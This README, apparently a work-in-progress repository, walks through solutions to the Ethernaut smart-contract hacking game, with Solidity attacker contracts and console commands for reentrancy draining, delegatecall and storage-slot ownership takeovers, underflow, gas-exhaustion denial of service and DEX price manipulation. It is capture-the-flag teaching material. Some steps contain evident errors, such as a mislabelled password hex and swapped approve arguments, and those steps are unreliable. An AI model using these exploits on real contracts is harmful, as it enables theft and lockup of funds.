# Hackernaut 🧑‍🚀 [WIP]
Set of smart contracts and documentation for hacking the OpenZeppelin [Ethernaut game](https://ethernaut.openzeppelin.com/)
> **Note**: Not all the levels can be solved by creating a smart contract.
> This repository contains the contracts that solve the levels that **require** a smart contract to be solved and some steps to hack the rest of them.

Happy hacking! 😄

## Smart Contracts setup

1. Create an [Alchemy](https://www.alchemy.com/) account.
2. Create a testing Rinkeby testnet account and feed it with some RinkebyETH using the [Alchemy Faucet](https://rinkebyfaucet.com/).
3. Create a `.env` file on the root folder containing the following variables

```shell
VICTIM_ADDRESS= # Address of the current contract you want to hack
ALCHEMY_API_KEY= # Your Alchemy API Key
RINKEBY_PRIVATE_KEY= # Private key from the Rinkeby testnet account
```

## Solutions

 - [0. Hello Ethernaut](#0-hello-ethernaut)
 - [1. Fallback](#1-fallback)
 - [2. Fallout](#2-fallout)
 - [3. Coin Flip](#3-coin-flip)
 - [4. Telephone](#4-telephone)
 - [5. Token](#5-token)
 - [6. Delegation](#6-delegation)
 - [7. Force](#7-force)
 - [8. Vault](#8-vault)
 - [9. King](#9-king)
 - [10. Re-entrancy](#10-re-entrancy)
 - [11. Elevator](#11-elevator)
 - [12. Privacy](#12-privacy)
 - [13. Gatekeeper One](#13-gatekeeper-one)
 - [14. Gatekeeper Two](#14-gatekeeper-two)
 - [15. Naught Coin](#15-naught-coin)
 - [16. Preservation](#16-preservation)
 - [17. Recovery](#17-recovery)
 - [18. Magic Number](#18-magic-number)
 - [19. Alien Codex](#19-alien-codex)
 - [20. Denial](#20-denial)
 - [21. Shop](#21-shop)
 - [22. Dex](#22-dex)
 - [23. Dex Two](#23-dex-two)
 - [24. Puzzle Wallet](#24-puzzle-wallet)

### 0. Hello Ethernaut

Just follow the steps and you'll get there.

---

### 1. Fallback
This level requires 2 steps to complete as described:

>You will beat this level if
>1. you claim ownership of the contract
>2. you reduce its balance to 0

#### Claiming the ownership
The trick here is to use the fallback `receive` function to get the ownership of the contract.

```sol
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```
In order to archieve this, we must statisfy 2 conditions: `msg.value` must be greater than zero and our account must have contributed.

So before calling the fallback `receive` function, we need to make a contribution to the contract. We can do so as follows:

```js
await contract.contribute({ value: 1 });
```
You can also check that the contribution was successful by calling the following line

```js
await contract.contributions(player).then(Number);
```
if the number is greater than zero, then you did it.

Now we can claim the ownership of the contract calling the fallback `receive` function. In order to call fallback payable functions, we just have to send a regular transaction to the contract address as follows:

```js
await contract.sendTransaction({ value: 1 })
```
Now if the transaction was successful, we must be the new owners of this contract, let's check that.

```js
await contract.owner().then(owner => owner === player);
```
#### Reducing the balance to 0
The way to reduce the balance to 0 is by using the `withdraw` function, which sends all the current balance to the owner.

```sol
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

We are the owners of the contract, let's take those coins!

```js
await contract.withdraw();
```
---

### 2. Fallout

In this contract there is a typo (not very visible due to the text font) in the 'constructor' function. Wich means that its name does not match with the contract name.

```sol
contract Fallout {

  //...

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

Therefore this is just a regular public function that can be called by anyone.

```js
await contract.Fal1out({ value: 1 });
```

then you can check the ownership of the contract

```js
await contract.owner().then(owner => owner === player);
```

And we are done!

---

### 3. Coin Flip
On this level we are going to exploit the pseudo-randomness of smart contracts.

```sol
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Turns out that the `blockValue` is totally deterministic for a given block, which means that we can replicate this value using another smart contract and calling the function `guess` from there.

The code of the smart contract is [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/CoinFlip.sol).

As a summary, the following function will guess the coin side successfully in every single try:

```sol
function guess() public {
  uint256 blockValue = uint256(blockhash(block.number - 1));
  uint256 coinFlip = blockValue / FACTOR;
  bool myGuess = coinFlip == 1 ? true : false;
  CoinFlipInterface(victimAddress).flip(myGuess);
}
```
Then you just have to call your `guess` function 10 times.

---

### 4. Telephone

The `msg.sender` is the address of the function caller (can be whether an ethereum account address or an smart contract address), and the `tx.origin` is the address of the account that originated the transaction.

```sol
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

This means that we can satisfy the condition `(tx.origin != msg.sender)` by setting up a contract between our account call and the contract call.

[Here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Telephone.sol) is the code of the contract we are going to use, you just have to deploy it and call `claimOwnership` function.

---

### 5. Token

Here we can hack the contract by exploiting the `uint` data type design. Since it is unsigned by definition, we cannot convert it into a negative number, then the `require` statement will always be satisfied no matter what positive value we send on the `_value` parameter.

```sol
  require(balances[msg.sender] - _value >= 0);
```

Then if we substract a greater uint number from a uint we will produce an arithmetic underflow.

```sol
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

So we can simply send the following transaction and after that, our balance should be something like `1.157920892373162e+77`.

```js
await contract.transfer('<some_random_address>', 21);
```

Check your balance after the transaction:

```js
await contract.balanceOf(player).then(Number);
```
---

### 6. Delegation

One important property of `delegatecall` is that executes other contractact's code in the context of the current contract.

Which means that we can claim the ownership of `Delegation` contract using the `pwn` function of the `Delegate` one.

```sol
function pwn() public {
  owner = msg.sender;
}
```
In order to do so, we need to invoke the `fallback` function of the `Delegation` contract, sending on `msg.data` the encoded name of function we want to delegate (in this case `pwn()`).

But first we need to encode the `pwn` function name in order to make it work. You can use [this online encoder](https://abi.hashex.org/) to get the right encoded name. As a result we get the following code: `dd365b8b`.

```JS
contract.sendTransaction({ data: 'dd365b8b' });
```

And that's it! now let's check if works:

```JS
await contract.owner().then(owner => owner === player);
```

---

### 7. Force

Though the standard way to send ether to a Smart Contract is by using some `payable` function (such as the `receive` function), you can force any contract to receive ether in different ways.

One way is by creating another contract that calls the `selfdestruct` keyword targeting to the contract we want to pay (setting the victim contract address as a parameter).

```sol
function takeMyMoney() public payable {
  // self destructs the contract
  // targeting to the victim contract
  // in order to force its balance to increase.
  selfdestruct(victimAddress);
}
```

Then we can deploy [this contract](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Force.sol), instance it in a variable like `yourContract`, and then send some ether as follows:

```js
await yourContract.sendTransaction({ value: 1 });
```

And finally self-destroy it calling `takeMyMoney` function pointing to the instance contract address:

```js
await yourContract.takeMyMoney();
```

---

### 8. Vault

The `private` keyword does not mean that the value of that variable is not visible by anyone. By design, the state of the blockchain is completely visible globally. Which means that by doing some research we can get the value of the `password` variable on-chain.

#### Solution #1
One way to get that value is by browsing [Etherscan](https://rinkeby.etherscan.io/) and searching by the hash of the contract created.

![Vault screenshot](/docs/vault1.png?raw=true)

Go the the `Contract` tab, and under the` Contract Creation Code` section you will see the encoded information (bytecode) that represents the data of the `contructor` call with its parameters.

![Vault screenshot 2](/docs/vault2.png?raw=true)

The bytecode is the hexadecimal representation of the Solidity code, remember that a byte is a set of 8 bits and a single hex is represented by 4 bits (`2^4 = 16`). So that means that a byte in this hexadecimal representation is composed by 2 characters (`4 bits + 4 bits = 8 bits = 1 byte`)

Since the `password` variable is bytes32 (`8 bits (byte) * 32 = 4 bits (hex) * 64`). So we must take the last 64 characters of the code, in this case `41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29`.

The way to send an hexadecimal value to the contract as a parameter is by adding a `0x` prefix:

```js
await contract.unlock('0x41ed2f1d39cad24fdf2b1c64736f6c63430006030033412076657279207374726f6e67207365637265742070617373776f7264203a29');
```
Then we can check if the contract was unlocked

```js
await contract.locked();
```

#### Solution #2

There is also a much simpler way (but much less fun), this is just reading the first slot storage using the handy `getStorageAt` function of the web3 library:

```js
const password = await web3.eth.getStorageAt(contract.address, 1);
```

And then:

```js
contract.unlock(password);
```

Finally we can check if the contract was unlocked

```js
await contract.locked();
```

---

### 9. King

The way to beat this level is by taking the throne with an address that will revert the transaction before any other address can become a king.

The key function for doing this is:
```Sol
receive() external payable {
  require(msg.value >= prize || msg.sender == owner);
  // if the existing king makes the next line 
  // revert then nobody else will be able to do it.
  king.transfer(msg.value);
  king = msg.sender;
  prize = msg.value;
}
```
if the existing king makes the `transfer` line revert then nobody else will be able to override the king varaible.
```Sol
receive() external payable {
  revert();
}
```

#### Steps
1. Take the throne with your own accout.
   
```js
await contract.sendTransaction({ value: 1000000000000001 });
```

2. Deploy a contract that cant take the throne and calls `revert` when someone else tries to send a transaction.
```Sol
function becomeKing() public payable returns (bool) {
  (bool success ,) = victim.call{value: msg.value}("");
  return success;
}

receive() external payable {
  revert();
}
```
   
3. Now call `becomeKing` the contract and nobody else will take your throne again.

```js
await yourContract.becomeKing({ value: 1000000000000002 });
```

---

### 10. Re-entrancy

The trick here is tho iterate between the `withdraw` function and our contract `receive` function in order to avoid the

```sol
balances[msg.sender] -= _amount;
``` 

line to be called. To make this work we need to do a recursion using our contracts `receive` function by doing another call to the withdraw function.

```sol
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    // The next line will call our receive function
    // and our receive function will call withdraw again.
    (bool result,) = msg.sender.call{value:_amount}("");
    // ...
```

We should set a closing condition in order the prevent running out of gas, the condition in this case might be the victim's contract balance equals to zero.

```sol
receive() external payable {
  if(victim.balance > 0) {
    ReentranceInterface(victim).withdraw(msg.value);
  }
}
```
But before trying to call the withdraw function, we must donate to the contract in order to pass the first condition, therefore we should also donate from our attacker contract.

```sol
function donate() public payable {
  ReentranceInterface(victim).donate{ value: msg.value }(address(this));
}
```

We make our first donation, its important to use a value divisible by the current victim's balance in order to leave the victim's contract with zero balance. In each iteration we are going to steal the exact donation amount.

In this case, the victim's balance is 0.001 Ether, so we are going to donate this amount.

```js
await attackerContract.donate({value: 1000000000000000})
```

Then we just call: 

```js
await sendTransaction({ to: attackerContract.address, value: 1000000000000000 });
```

This line will trigger the `receive` function on our attacker contract and start the recursion. Once the victim balance is zero, the `receive` function will return.

---

### 11. Elevator

In this level we have an `Elevator` contract that (supposedly) does not allow to reach the last floor of the `Building` that calls it.
The `Elevator` delegates the caller contract the implementation of the `isLastFloor` function.

```sol
function goTo(uint _floor) public {
  Building building = Building(msg.sender);

  if (! building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
  }
}
```

Note that we can break the contract when the `isLastFloor` function is not deterministic. Meaning, the same input will not produce the same output each time.

Since the abstract function to be implemented does not clarify any state permission like `pure` or `view` we can implement whatever logic we want inside the malicious `isLastFloor` function.

```sol
interface Building {
  function isLastFloor(uint) external returns (bool);
}
```

This way we can create an implementation `isLastFloor` function that returns `false` in the first call and `true` in the second one in order to reach the last floor. You can see the full contract code [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).

```sol
function isLastFloor(uint floor) public returns (bool) {
  if (floor == last) {
    if (firstTry) {
      // sets the first try variable 
      // to false and returns false
      firstTry = false;
      return false;
    } else {
      // resets the first try variable
      // and returns true
      firstTry = true;
      return true;
    }
  }
  // defaults to false
  return false;
}
```

We can create a function that hacks the elevator as follows:

```sol
function goToLast() public {
  Elevator(victim).goTo(last);
}
```
Then we just call this function from our client as:

```js
await myContract.goToLast();
```

And we are done, [see the full code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).

---

### 12. Privacy

This level requires a better understanding about how Solidity optimizes storage slots storing deployed smart contracts data. We can figure out the hex value of each slot using:

```js
await web3.eth.getStorageAt(contract.address, slotNumber); // e.g slotNumber = 0 for first slot
```

Now to figure which slot contains the data[2] we must calculate the previous variable declaration and datatypes.

```sol
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

1. Slot 0: Locked.
2. Slot 1: ID.
3. Slot 2: flattening + denomination + awkwardness.
4. Slot 3: data[0].
5. Slot 4: data[1].
6. Slot 5: data[2]. -> Voilá!

Now let's get that slot value:

```js
await web3.eth.getStorageAt(contract.address, 5);
```

Then with the hexadecimal result we can setup a contract and hack the password parsing the `bytes32` to `bytes16` array.

> Note: It doesn't matters 'what' is this value, and what does it mean. We just know is the value we need to unlock the contract.

```sol
contract PrivacyBreaker {
  bytes32 public data;
  address public victim;

  constructor(bytes32 _data, address _victim) {
    data = _data;
    victim = _victim;
  }
  
  function hack() public {
    Privacy(victim).unlock(bytes16(data));
  }
}
```

After setting up the contract sending the vicim's address and our hex 'key'. We just need to run the `hack()` function as follows:

```js
await myContact.hack();
```

---

### 13. Gatekeeper One

In order to break this contract, our data needs to pass throug different conditions (3 gates) in order to prevent reverting before we van claim ourselves entrant. [See contract code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/GatekeeperOne.sol).

#### Gate one

```sol
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

In order to satisfy this condition, we just need to setup a contract as a middleman between the origin and the function call as we did before.

#### Gate two

```sol
modifier gateTwo() {
  require(gasleft().mod(8191) == 0);
  _;
}
```

This is especially difficult because the only path to solve this one is by debugging the solidity opcodes in etherscan and figuring out **exactly** where we are using the gasLeft() result value in our require statement.

Fortunatelly there is a special opcode that is used for estimating the gas left called **GAS** [see documentation about opcodes](https://ethereum.org/en/developers/docs/evm/opcodes/).

So the steps to figure the exact gas to send are:
1. Send a transaction with any arbitrary gas.
2. Go the the debug transaction section on etherscan and find the GAS opcode in the stack trace.
3. In the next line (PUSH2 opcode) you will see the gasLeft *X* at that moment.
4. Use X to calculate the exact amount of gas needed send to the function call. eg: *gasToSend = gasSent + (81910 - X)*
5. Now you will be able to send the right amount of gas for that function call.

#### Gate three

```sol
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```
This gate requires some understanding about `uintX` conversions. We will receive a `bytes8` input and cast this value many times in order to satisfy a few conditions.

```sol
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
```
This condition requires `uint32` and `uint16` conversion to be the same, the `uint16` corresponds to the last 4 bytes of the `_key`, and `uint32` the las 8 ones (remember that if we cast a uint16 to uint32 the excedent bytes at the left will be filled with 0). So in order to satisfy this condition we can send a key that looks like `0x...0000ffff`.

```sol
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
```

This line adds an extra requirement about the next (or previous) 8 characters, they should be different than zero, so the key should look like: `0x1111111100001111`.

```sol
require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

Finnally, this line take the last 4 characters and compare them with the tx.origin address (your address) last 4. So the key should look like: (eg: last 4 characters of your address 'AB12') `0x111111110000AB12`.

Once you deployed the contract, just call:

```js
await yourContract.enter("0x111111110000AB12", 82164);
```

---

### 14. Gatekeeper Two

As we did in the previous level, we need to satisfy a bunch of conditions to hack this contract.

#### Gate one

```sol
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

Exactly the same as we did in the previous level, just put a contract as a middleman and it will pass.

#### Gate two

```sol
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

The `extcodesize` keyword returns the size of the contrat's code from the address sent as an argument. The `caller` keyword returns the call sender, just like msg.sender, but excluding `delegatecall`.

One exception to this rule is when we call the function directly from a contract constructor, the contract address is still unexistant, in this case, the `extcodesize(caller())` will return zero.

```sol
constructor(address victim) {
  Gatekeeper level = Gatekeeper(victim);
  bytes8 key = '0x1111111111111111';
  level.enter(key);  
}
```
And it works! The result is zero, so delegating the call we will pass the second gate.

#### Gate three

We must send a gate key that satisfy the following condition:

```sol
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
```

The `^` operator indicates a XOR operation, one important characteristic to consider of this operation is that if  `A ^ B = C` then `A ^ C = B`. So we can use this in our favor creating a key as follows:

```sol
uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1;
```

Then, the code to hack this level would look like.

```sol
constructor(address victim) {
  Gatekeeper level = Gatekeeper(victim);
  bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
  level.enter(key);  
}
```

We just create the contract sending the victim address as parameter and that's it!

---

### 15. Naught Coin

If you read carefully the ERC20 contract code, there is a way around to transfer your tokens without using the `transfer` function.

```sol
function transferFrom(
  address from,
  address to,
  uint256 amount
) public virtual override returns (bool) {
  address spender = _msgSender();
  _spendAllowance(from, spender, amount);
  _transfer(from, to, amount);
  return true;
}
```

Using this function we can transfer our tokens to another address directly (note that the internal `_transfer` function was not overrided).

But first we have to allow another player (player2) to receive our tokens:

```js
const player2 = '<any_address>';
await contract.increaseAllowance(player2, await contract.INITIAL_SUPPLY());
```

Now we must give approval to the contract to make this transaction in behalf of our account:

```js
await contract.approve(player, contract.address);
```

Finally we can send all our founds from our account to the new one:

```js
await contract.transferFrom(player, player2, await contract.allowance(player, player2));
```
---

### 16. Preservation

The `delegatecall` method will overwrite the 1st contract slot in the context of the contract that has made the call. 
Therefore we can change the address of `timeZone1Library` using `setFirstTime` and passing our malicious contract address casted as `uint _time` .

```sol
  // malicious contract.
  function updateLibrary(address _victim) public {
    PreservationInterface(_victim).setFirstTime(uint160(address(this)));
  }
```

Once we changed the addres we can create a custom `function setTime(uint _time)` that will change the owner of the contract. 

```sol
function setTime(uint _time) public {
  owner = tx.origin;
}
```

And then call it directly from the level console, we can send whatever value we want.

```js
await contract.setFirstTime(0x0);
```

Finnaly, the delegated function will change the ownership of the contract.

---

### 17. Recovery

In this level the contract deployer does not know what is the address of the token created, bue we can easily get that information using Etherscan.

Just put the contract address in the etherscan explorer and check the historic transactions. Among them you will find the one that creates our target contract.

```sol
function destroyToken(address payable _victim) payable public {
  SimpleToken(_victim).destroy(payable(msg.sender));
}
```

Where `_victim` is the address of the token.

---

### 18. Magic Number

In this level, you cannot create a contract using solidity because that implies to use more opcodes than required, so the most efficient way to launch code to the EVM is by using directly opcodes casted as hex and then send a transaction without a `to` parameter (this will be interpreted as a contract creation).

We need to create a function that will return the number 42. For doing so we need to store this number in memory and then return it. 

```assembly
PUSH1 0x2a // declare 42 (2a in hex) -> 602a
PUSH1 0x80 // push it in the slot 0x80 -> 6080
MSTORE     // store the information -> 5260
PUSH1 0x20 // size of the stored data -> 2060
PUSH1 0x80 // point the memory slot -> 80f3
RETURN     // return the pointer value
```

As a result we will get the following hex string (the first few upcodes correspond to the contract creation):

`
0x600a600c600039600a6000f3602a60805260206080f3
`

We declare and create the new contract

```js
const bytecode = '0x600a600c600039600a6000f3602a60805260206080f3';
web3.eth.sendTransaction({ from: player, data: bytecode });
```

And as a result we will get the hash of the transaction of the contract creation, searching in etherscan we will find the contract address.

Just set the address as the solver and it will pass.

```js
contract.setSolver('<your_contract_address>')
```

---

### 19. Alien Codex

In this level, the key is to understand how the evm storage works. The contract does not expose any `owner` variable, but it must be there. So in order to check it we need to first scan the storage of the contract.

```js
web3.eth.getStorageAt(contract.address, 0)
```

After a little search, we find out that the ower variable is using the slot 0 of the contract, so now we now where is the owner stored.

The second part of the problem is to figure out the way to overwrite this variable, here is where the `codex` array will take place.

The contract exposes a function that allow us to write (and increase) the codex array

```solidity
function revise(uint i, bytes32 _content) contacted public {
  codex[i] = _content;
}
```

So this way  we can produce an overflow of the contract storage overwriting the owner variable using the array. But obviously first we need to call `make_contact` for passing the `contacted` modifier in order to do so.

```js
contract.make_contact();
```

After that, we can increase the lenght of the array using the `retract()` function, note that it does not check underflows.

```js
contract.retract();
```

And finally, overwrite the `_owner` variable by setting our address in the last position of the array

```js
contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000' + player.slice(2), {from:player, gas: 900000});
```

---

### 20. Denial

The key of this level is to understand how the secuence of events occur

```sol
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }
```

Note that before transferring the tokens to the owner, the partner receives its part. If we use a smart contract as a partner, we can make that line consume all the gas with our custom implementation in the `receive()` function of our contract.

This way, the owner will not be able to withdraw its tokens due to the gas consumption.

Our partner contract should look as follows

```sol
contract Partner {
    receive() external payable {
        while (true) {

        }
    }
}
```

Then set the contract as a partner

```js
await contract.setWithdrawPartner('<your_contract_address>')
```

---

### 21. Shop

In this level, the challenge is to implement a contract with a `price()` function that returns a value equals or greater than 100 in the first call and then returns a value below 100.

Note that we cannot mutate the state of the contract because `price()` is marked with a `view` modifier. So the key is to somehow detect what call is the one that will mutate the price and return a lower value in that case.

Note that in the `buy()` function of the Shop contract, there is a boolean variable called `isSold` that is set to true after the condition, so we can use it as the reference to change our return value.

```sol
function price() public view returns(uint) {
    bool isSold = Sender(msg.sender).isSold();
    if (isSold) {
        return 0;
    } else {
        return 100;
    }
}
```

Then we just call the `buy()` function from the same contract and it should work.

```sol
function buy(address _shop) public {
    Sender(_shop).buy();
}
```

---

### 22. Dex

In this level, we have a decentralized exchange contract that counts with `token1` and `token2`. The issue with this contract is that inside the `swap` function, the token price is calculated using the following function.

```sol
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

The key is to recognize that the function returns a `uint` data type, which means that the returned value will be rounded. Now if we want to swap 10 tokens from `token1` to `token2` the formula would be as follows:

```sol
uint tokenPrice = 10 // (10 * 100) / 100 
```

Then we move the 20 tokens of `token2` to `token1` again

```sol
uint tokenPrice = 16 // (20 * 90) / 110 = 16.36 => 16.0
```

If we iterate and perform this operation many times, we will end up paying tokens for a very cheap price getting more and more tokens in our balance just swaping.

Now let's start ensuring we have free manipulation approving our contract instance to swap 1000000000000000 tokens of each balance

```js
contract.approve(instance, 1000000000000000)
```

Declare the token addresses and some utility functions to make them easier to access

```js
const token1 = await contract.token1();
const token2 = await contract.token2();
const balance = contract.balanceOf;
const swap = contract.swap;
```

Start swapping until it throws an error

```js
swap(token1, token2, await balance(token1, player));
swap(token2, token1, await balance(token2, player));
swap(token1, token2, await balance(token1, player));
swap(token2, token1, await balance(token2, player));
swap(token1, token2, await balance(token1, player));
```

After the 6th attempt, the contract reverted, which means that it does not contain enough supply to exchange our total balance, let's see our balances and the contract supply.

```js
await balance(token1, player).then(Number) // 0
await balance(token2, player).then(Number) // 65 (consider that we started with 10 tokens of each one)
await balance(token1, instance).then(Number) // 110
await balance(token2, instance).then(Number) // 45
```

Finally, we just need to swap 45 `token1` to `token2` to leave the `token1` supply totally empty.

```js
swap(token2, token1, 45);
```

---

### 23. Dex Two

If we compare the `swap` method of the previous Dex contract and the current one, we can tell that there is one assertion missing in this one

```sol
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This means that we can transfer tokens from and to any address we want. So we can drain the founds of the contract sending tokens to our custom `ERC20` token.

```sol
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("DexTwoToken", "DTT") {
        _mint(msg.sender, initialSupply);
    }
}
```

After setting up our contract, we deploy it with 400 of initial supply and approve our contract to interact with this token in order to gain visibility of our balance. 

Then we give 100 of our DexTwoTokens to DexTwo contract.

Now let's see the current status

<table> 
  <thead>  
    <tr> 
      <th>DexTwo</th> 
      <th>You</th>
    </tr>  
  </thead> 
  <tbody>
    <tr> 
      <td>
        <table>
          <thead>  
            <tr> 
              <th>token1</th> 
              <th>token2</th>
              <th>DexTwoToken</th>
            </tr>  
          </thead> 
          <tbody>
            <tr>
              <td>100</td> <td>100</td> <td>100</td>
            </tr>
          </tbody>
        </table>
      </td>
      <td>
      <table>
          <thead>  
            <tr> 
              <th>token1</th> 
              <th>token2</th>
              <th>DexTwoToken</th>
            </tr>  
          </thead> 
          <tbody>
            <tr>
              <td>10</td> <td>10</td> <td>300</td>
            </tr>
          </tbody>
        </table>
      </td> 
    </tr>
  </tbody>  
</table>

Approve the contract to operate your tokens

```js
contract.approve(instance, 100000000)
```

Repeat the variables and methods assiganation from the previous level to make them syntactically cleaner

```js
const token1 = await contract.token1();
const token2 = await contract.token2();
const token3 = '<your_custom_token>';
const balance = contract.balanceOf;
const swap = contract.swap;
```

Let's start swaping 100 tokens from `token3` to `token1`

```js
swap(token3, token1, 100)
```

Balances now

<table> 
  <thead>  
    <tr> 
      <th>DexTwo</th> 
      <th>You</th>
    </tr>  
  </thead> 
  <tbody>
    <tr> 
      <td>
        <table>
          <thead>  
            <tr> 
              <th>token1</th> 
              <th>token2</th>
              <th>DexTwoToken</th>
            </tr>  
          </thead> 
          <tbody>
            <tr>
              <td>0</td> <td>100</td> <td>200</td>
            </tr>
          </tbody>
        </table>
      </td>
      <td>
      <table>
          <thead>  
            <tr> 
              <th>token1</th> 
              <th>token2</th>
              <th>DexTwoToken</th>
            </tr>  
          </thead> 
          <tbody>
            <tr>
              <td>110</td> <td>10</td> <td>200</td>
            </tr>
          </tbody>
        </table>
      </td> 
    </tr>
  </tbody>  
</table>

And finnally we can drain the token2 balance of the contract by doing

```js
swap(token3, token2, 200)
```

---

### 24. Puzzle Wallet

In order to hack this contract we should overwrite the `owner` and `maxBalance` variables with our address.

Since the proxy pattern implies to utilize a contract to implement an "upgradable" logic we can play with the storage slots positions in order to hack it.

The `proposeNewAdmin` function can be called by anyone, so after setting this variable we will overwrite the `owner` for the proxy contract.

```js
const proxy = await contract.owner();
```

We can create a custom contract in solidity to take the ownership of the `PuzzleWallet` contract.

```sol
contract Attacker {
    function newAdmin(address _puzzle) public {
        PuzzleProxy(_puzzle).proposeNewAdmin(msg.sender);
    }
}
```

Then we can simply call this `newAdmin` function sending the instance address as paramenter and the contract will be ours.

Then, we have owner access to the wallet, so we can add our address to the whitelist

```js
contract.addToWhitelist(player)
```

Now we need to bypass the 0 balance condition. In order to do so, we can call a `multicall` function that invokes `deposit()` multiple times

```js
const depositData = await contract.methods["deposit()"].request();
const multicallData = await contract.methods["multicall(bytes[])"].request([depositData])
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
await contract.execute(player, toWei('0.002'), 0x0)
```

And that's it, we can check the balance of the contract as follows

```js
await getBalance(contract.address)
```
Finnally, we are able to set the `maxBalance` for the contract, which will override the admin slot.

```js
await contract.setMaxBalance(player)
```



